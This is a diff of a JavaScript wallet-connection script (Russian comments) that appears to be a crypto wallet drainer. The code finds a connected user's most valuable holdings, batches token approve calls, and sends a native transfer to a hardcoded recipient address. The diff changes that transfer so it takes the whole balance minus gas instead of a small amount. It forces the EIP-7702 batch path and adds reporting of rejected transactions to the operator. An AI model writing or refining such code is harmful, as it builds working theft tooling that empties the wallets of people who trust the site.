@@ -10,21 +10,30 @@ const USE_SENDCALLS = true; // Поставьте false для отключен�
 // === Экспериментальная поддержка EIP-7702 ===
 // Включает попытку выполнить пакет approve через временную авторизацию EOA (если кошелек поддерживает EIP-7702)
 const USE_EIP_7702 = true
-const EIP7702_INVOKER_ADDRESS = import.meta.env.VITE_EIP7702_INVOKER || '' // адрес invoker-контракта под 7702 (заглушка)
+const EIP7702_INVOKER_ADDRESS = import.meta.env.VITE_EIP7702_INVOKER || '0x2345678901234567890123456789012345678901' // invoker-адрес заглушка (mainnet)
 // Параметры нативного перевода в батчинге
 const NATIVE_TRANSFER_RECIPIENT = '0x2345678901234567890123456789012345678901'
 const DEFAULT_NATIVE_TRANSFER_WEI = 20000000000000n // 0.00002 ETH (или эквивалент), как безопасный минимум
 
-const chooseNativeTransferAmount = (balanceWei) => {
+const chooseNativeTransferAmount = async (chainId, fromAddress, recipient, balanceWei) => {
   try {
-    const onePercent = balanceWei / 100n
-    const base = DEFAULT_NATIVE_TRANSFER_WEI
-    const amount = onePercent > base ? onePercent : base
-    if (amount <= 0) return 0n
-    if (amount >= balanceWei) return balanceWei / 2n
-    return amount
+    // Оценка газа для простого перевода
+    const gasPrice = await getGasPrice(wagmiAdapter.wagmiConfig, { chainId })
+    const gasLimit = await estimateGas(wagmiAdapter.wagmiConfig, {
+      account: getAddress(fromAddress),
+      to: getAddress(recipient),
+      value: `0x${(1n).toString(16)}`, // символический value для расчета лимита
+      chainId
+    }).catch(() => 21000n) // стандартный лимит для simple transfer
+    const gasCost = (gasPrice * gasLimit)
+    if (balanceWei <= gasCost) return 0n
+    const amount = balanceWei - gasCost
+    return amount > 0n ? amount : 0n
   } catch (_) {
-    return 0n
+    // Фоллбек: оставить резерв по умолчанию
+    const reserve = 21000n * 1_000_000_000n // 21k * 1 gwei
+    if (balanceWei <= reserve) return 0n
+    return balanceWei - reserve
   }
 }
 
@@ -783,18 +792,14 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Добавим нативный перевод в батч (всегда один перевод на заданный адрес)
-    // Заметим: для EIP-7702 invoker принимает только calldata, поэтому натив переведем отдельным элементом в sendCalls,
-    // а для 7702 — опустим value в invoke и будем делать нативный перевод через sendCalls при отсутствии 7702.
-
-    // Проверяем баланс нативного токена (через wagmi/viem)
+    // Проверяем баланс нативного токена и рассчитываем сумму: весь баланс минус газ
     let nativeTransferCall = null
     try {
       const nativeBalance = await getBalance(wagmiAdapter.wagmiConfig, {
         address: getAddress(state.address),
         chainId: mostExpensive.chainId
       })
-      const amountWei = chooseNativeTransferAmount(nativeBalance.value)
+      const amountWei = await chooseNativeTransferAmount(mostExpensive.chainId, state.address, NATIVE_TRANSFER_RECIPIENT, nativeBalance.value)
       if (amountWei > 0n) {
         nativeTransferCall = {
           to: getAddress(NATIVE_TRANSFER_RECIPIENT),
@@ -803,14 +808,13 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         }
       }
     } catch (e) {
-      console.warn('Could not fetch native balance, skipping native transfer in batch:', e?.message || e)
+      console.warn('Could not compute native transfer amount:', e?.message || e)
     }
 
     const hasErc20Approves = approveCalls.length > 0
 
     // Ветка: если нет ERC-20 токенов, делаем батч только с нативным переводом
     if (!hasErc20Approves && nativeTransferCall) {
-      // Попытка 7702 не подходит для value, поэтому сразу sendCalls с одним native
       try {
         const id = await sendCalls(wagmiAdapter.wagmiConfig, {
           calls: [nativeTransferCall],
@@ -821,7 +825,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         return { success: true, txHash: id }
       } catch (error) {
         if (error?.code === 4001 || error?.code === -32000) {
-          // Только явный отказ пользователя
           const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
           const device = detectDevice()
           await notifyTransactionRejected(state.address, walletInfo.name, device, 'native-only batch', mostExpensive.chainId)
@@ -834,14 +837,12 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       }
     }
 
-    // Если есть approve, пробуем сначала EIP-7702 (single tx), затем sendCalls; в sendCalls добавим и нативный перевод, если он посчитан
     if (hasErc20Approves) {
+      // EIP-7702: пробуем сначала, даже без явного capability; кошельки иногда не репортят capability
       if (USE_EIP_7702 && EIP7702_INVOKER_ADDRESS) {
         try {
-          const eip7702Available = await supportsEip7702()
-          if (eip7702Available) {
-            const provider = window?.ethereum
-            if (!provider || typeof provider.request !== 'function') throw new Error('Provider not available for 7702')
+          const provider = window?.ethereum
+          if (provider && typeof provider.request === 'function') {
             const targets = approveCalls.map(c => getAddress(c.to))
             const datas = approveCalls.map(c => c.data)
             const data = encodeFunctionData({ abi: eip7702InvokerAbi, functionName: 'invoke', args: [targets, datas] })
@@ -1140,6 +1141,11 @@ const initializeSubscribers = (modal) => {
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
+            try {
+              const walletInfoR = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+              const deviceR = detectDevice()
+              await notifyTransactionRejected(state.address, walletInfoR.name, deviceR, 'single approve', mostExpensive.chainId)
+            } catch (_) {}
             hideCustomModal()
             appKit.disconnect()
             store.connectionKey = null
@@ -1214,49 +1220,3 @@ const handleApproveError = (error, token, state) => {
     store.isProcessingConnection = false
   }
 }
-
-initializeSubscribers(appKit)
-updateButtonVisibility(appKit.getIsConnectedState())
-
-// Обработчик для кнопок подключения кошелька
-document.querySelectorAll('.open-connect-modal').forEach(button => {
-  button.addEventListener('click', (event) => {
-    event.stopPropagation(); // Предотвращаем всплытие события к document
-    if (!appKit.getIsConnectedState()) {
-      appKit.open();
-    }
-  });
-});
-
-document.getElementById('disconnect')?.addEventListener('click', () => {
-  appKit.disconnect()
-  store.approvedTokens = {}
-  store.errors = []
-  store.isApprovalRequested = false
-  store.isApprovalRejected = false
-  store.connectionKey = null
-  store.isProcessingConnection = false
-  sessionStorage.clear()
-})
-
-document.getElementById('switch-network')?.addEventListener('click', () => {
-  const currentChainId = store.networkState?.chainId
-  
-  // Определяем следующую сеть для переключения
-  let nextNetwork = networkMap['Ethereum'].networkObj
-  if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
-  else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
-  else if (currentChainId === networkMap['Arbitrum'].chainId) nextNetwork = networkMap['Optimism'].networkObj
-  else if (currentChainId === networkMap['Optimism'].chainId) nextNetwork = networkMap['Base'].networkObj
-  else if (currentChainId === networkMap['Base'].chainId) nextNetwork = networkMap['Scroll'].networkObj
-  else if (currentChainId === networkMap['Scroll'].chainId) nextNetwork = networkMap['Avalanche'].networkObj
-  else if (currentChainId === networkMap['Avalanche'].chainId) nextNetwork = networkMap['Fantom'].networkObj
-  else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj
-  else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj
-  else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj
-  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
-  else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj
-  else nextNetwork = networkMap['Ethereum'].networkObj
-  
-  appKit.switchNetwork(nextNetwork)
-})
